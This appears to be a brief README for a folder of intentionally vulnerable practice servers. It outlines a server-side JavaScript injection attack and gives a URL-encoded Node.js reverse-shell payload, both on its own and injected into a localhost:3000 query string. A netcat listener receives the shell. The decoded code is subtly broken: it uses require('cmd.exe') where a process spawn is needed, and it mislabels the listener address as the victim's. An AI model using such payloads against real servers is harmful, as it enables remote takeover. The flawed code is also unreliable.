*all the servers in this folder are vulnerable.*

## Attacking servers

#### SSI

1. build shell script
2. encode script to url
3. use nc to monitor the victim IP address
4. attack server with payload

i.e Url Encoded payload
```
function%20attack%28%29%20%7B%0A%20%20const%20net%20%3D%20require%28%27net%27%29%3B%0A%20%20const%20cp%20%3D%20require%28%27child_process%27%29%3B%0A%20%20const%20cmd%20%3D%20require%28%27cmd.exe%27%2C%20%5B%5D%29%3B%0A%20%20const%20client%20%3D%20new%20net.Socket%28%29%3B%0A%20%20const%20VICTIM_IPADDR%20%3D%20%27127.0.0.1%27%3B%20%2F%2F%20edit%20this%0A%0A%20%20client.connect%283434%2C%20VICTIM_IPADDR%2C%20%28%29%20%3D%3E%20%7B%0A%20%20%20%20client.pipe%28cmd.stdin%29%3B%0A%20%20%20%20cmd.stdout.pipe%28client%29%3B%0A%20%20%20%20cmd.stderr.pipe%28client%29%3B%0A%20%20%7D%29%3B%0A%0A%20%20return%201%3B%0A%7Dattack%28%29%3B%0A
```

localhost:3000/?a=function%20attack%28%29%20%7B%0A%20%20const%20net%20%3D%20require%28%27net%27%29%3B%0A%20%20const%20cp%20%3D%20require%28%27child_process%27%29%3B%0A%20%20const%20cmd%20%3D%20require%28%27cmd.exe%27%2C%20%5B%5D%29%3B%0A%20%20const%20client%20%3D%20new%20net.Socket%28%29%3B%0A%20%20const%20VICTIM_IPADDR%20%3D%20%27127.0.0.1%27%3B%20%2F%2F%20edit%20this%0A%0A%20%20client.connect%283434%2C%20VICTIM_IPADDR%2C%20%28%29%20%3D%3E%20%7B%0A%20%20%20%20client.pipe%28cmd.stdin%29%3B%0A%20%20%20%20cmd.stdout.pipe%28client%29%3B%0A%20%20%20%20cmd.stderr.pipe%28client%29%3B%0A%20%20%7D%29%3B%0A%0A%20%20return%201%3B%0A%7Dattack%28%29%3B%0A

